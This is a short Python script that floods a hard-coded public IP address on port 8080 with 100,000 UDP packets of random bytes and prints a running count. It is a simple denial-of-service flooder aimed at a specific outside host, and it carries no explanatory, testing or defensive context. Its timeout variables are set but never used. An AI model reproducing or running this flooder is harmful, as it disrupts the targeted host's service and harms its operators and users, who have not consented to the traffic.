import socket
import random
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)

ip = "31.13.66.69"
port = 8080
duration = 1
timeout = time.time() + duration
xx = 0

for item in range(1,100_001,1):
    sock.sendto(bytes,(ip,port))
    xx = xx + 1
    print("Sent %s packet to %s port %s" %(xx,ip,port))